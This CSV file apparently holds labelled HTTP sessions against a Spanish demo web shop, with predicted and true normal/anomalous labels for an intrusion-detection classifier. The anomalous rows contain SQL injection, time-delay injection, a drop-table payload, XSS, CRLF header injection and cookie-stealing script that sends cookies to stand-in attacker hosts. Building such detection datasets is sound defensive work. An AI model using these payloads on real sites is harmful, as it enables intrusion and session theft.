data,y_pred,y_test
"gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730 gethttp://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif/.old gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=clarence&password=varona&nombre=arnulfo&apellidos=aniceto+lacunza&email=polk@tintaultravioleta.mx&dni=52722813m&direccion=ca+lle++murcia,+72,+*10?a&ciudad=ribes+de+freser&cp=16122&provincia=valencia&ntc=8960498379744557&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp.old gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1520&b1a=confirmar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2='or'a='a gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cadtools&pwd='or'a='a&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helma&password=92h126na&nombre=francisco+de+borja&apellidos=sofra+galcer�n&email=mizell@x2.com.vu&dni=61328646c&direccion=parc+de+la+budellera,+3,+4-b&ciudad=monteagudo+de+las+vic.ar�as&cp=43421&provincia=huesca&ntc=0417370510264127&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=bob@<script>alert(paros)</script>.parosproxy.org gethttp://localhost:8080/4861362529278789730.bak gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tejani&password=portalada&nombre=jere?m�as&apellidos=alonso+roelas&email=schall@andrestabernero.fj&dni=54598546l&direccion=c/+almonacid+de+zorita+93+&ciudad=torres&cp=36940&provincia=pontevedra&ntc=4087367001263423&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=agata&pwd=alambrada&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.bak posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alisande6&password=aviadoraany%3f%0aset-cookie%3a+tamper%3d5765205567234876235&nombre=rosendo&apellidos=schulz+de+buran&email=geldart5@corjet.hk&dni=10019031r&direccion=travesia+sacrificio+111,+7-e&ciudad=font+d'en+carr�s,+la&cp=26584&provincia=albacete&ntc=0497967469696167&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.old gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6071&b1=confirmar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=+&nombre=jam�n+ib�rico&precio=85&cantidad=85&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/iissamples/sdk/asp/database/simplequery_vbscript.asp gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%20 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&login=barrell&password=bu70nvil2a&nombre=aristarco&apellidos=porflit+strick&email=holton@enigmatico.vu&dni=91802907v&direccion=c/+hipica,+17+6?g&ciudad=robladillo&cp=31498&provincia=asturias&ntc=2382356887659758&b1=registrar gethttp://localhost:8080/6909030637832563290.jsp posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasparos%22%20style=%22background:url(javascript:alert('paros'))",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5289&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yeirnie9&pwd=41tt8&remember=on/&b1=entrar gethttp://localhost:8080/ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=| gethttp://localhost:8080/tienda1/publico.old posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yurik&password=a4orrachada&nombre=rock&apellidos=morales+urgell&email=golabek@joll.cf&dni=63bb304028r&direccion=plegadero+alto+48,+&ciudad=alf�s+del+pi,+l'&cp=13120&provincia=cuenca&ntc=7817403668944119&b1=registrar gethttp://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif.inc gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=vino+rioja&precio=39&cantidad=58&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=daesik2&password=24�58ca1e581&nombre=panciano&apellidos=bonitto+ciraco&email=dorsay.thursby@elrincondelmarmol.pr&dni=51834543h';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&direccion=cabo+de+agua,+s/n+&ciudad=villafranca+de+los+barros&cp=21240&provincia=ja�n&ntc=8319637256237029&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/_vti_bin/ gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=39&cantidad=40&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=,lynde&pwd=9ec828&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=watchorn&password=gin09r9n3&nombre=alcira&apellidos=marcapura+pachecote&email=wolheim@soyrojo.se&dni=79531407y&direccion=','0');waitfor+delay+'0:0:15';--&ciudad=deleitosa&cp=49410&provincia=baleares+(illes)&ntc=4881993166167995&b1=registrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chihhua&password=iri4arand+1=1&nombre=hebert&apellidos=fonts+westermeier&email=hemmings_vos@programasalquilermaquinaria.ag&dni=55492932g&direccion=c/+bazan+184+4?a&ciudad=garcia&cp=10812&provincia=soria&ntc=2183980302594165&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jenn&password=afrancesamiento&nombre=ada','0','0','0');waitfor+delay+'0:0:15';--&apellidos=matar�+i�iguez&email=newfield.watase@cortinasartesol.yu&dni=75678701f&direccion=calle+sol+188+9-h&ciudad=santo+domingo+de+la+calzada&cp=45179&provincia=albacete&ntc=9167215819238112&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e? gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=?&nombre=queso+manchego&precio=85&cantidad=55&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=29&b1=a�adir+al+carrito",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2533&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goddette&password=ci2586ta&nombre=raimund&apellidos=forcades+chocano&email=drohocka@baybay.mq&dni=67718883y&direccion=hornillos+s/n,+&ciudad=valle+de+mena&cp=34309&provincia=valladolid&ntc=4087914907992137&b1=registrar gethttp://localhost:8080/tienda1/global/estilos.css gethttp://localhost:8080/tienda1/global/creditos.jsp posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 gethttp://localhost:8080/tienda1/imagenes/3.gif gethttp://localhost:8080/tienda1/index.jsp gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dikaitis5&password=sanidad&nombre=evandro&apellidos=valdivieso&email=james_ponnamma@autobuses-hibridos.tn&dni=13791863m&direccion=el+cartero+44+5-b&ciudad=anguita&cp=34126&provincia=alicante&ntc=3728906567349968&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=roderick&pwd=in5rover88&remember=on&b1=entrar",normal,normal
gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg gethttp://localhost:8080/tienda1/publico/carrito.jsp posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 gethttp://localhost:8080/tienda1/publico/productos.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg gethttp://localhost:8080/tienda1/miembros/index.jsp gethttp://localhost:8080/tienda1/publico/productos.jsp gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100&cantidad=8&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,normal,normal
gethttp://localhost:8080/tienda1/imagenes/1.gif gethttp://localhost:8080/tienda1/miembros/fotos.jsp gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=santa&pwd=sequero&remember=off&b1=entrar gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2237&b1=confirmar gethttp://localhost:8080/tienda1/global/creditos.jsp gethttp://localhost:8080/tienda1/imagenes/logo.gif gethttp://localhost:8080/tienda1/imagenes/logo.gif gethttp://localhost:8080/tienda1/global/menum.jsp gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,normal,normal
"gethttp://localhost:8080/tienda1/global/estilos.css gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 gethttp://localhost:8080/tienda1/publico/miembros.jsp posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=humphrie&password=pelamen&nombre=caleb&apellidos=manay+crespo&email=terry@mtos.ar&dni=73488403e&direccion=c/+jara+9,+&ciudad=campanario&cp=47320&provincia=segovia&ntc=9267680844011077&b1=registrar gethttp://localhost:8080/tienda1/publico/productos.jsp posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3525&b1=pasar+por+caja gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg",normal,normal
gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=banaei&pwd=enga3ladu4a&remember=off&b1=entrar gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg gethttp://localhost:8080/tienda1/publico/miembros.jsp gethttp://localhost:8080/tienda1/global/estilos.css posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3096&b1=pasar+por+caja gethttp://localhost:8080/tienda1/global/creditos.jsp gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cybotech&pwd=escobado&remember=off&b1=entrar gethttp://localhost:8080/tienda1/imagenes/1.gif gethttp://localhost:8080/tienda1/miembros/fotos.jsp gethttp://localhost:8080/tienda1/miembros/index.jsp,normal,normal
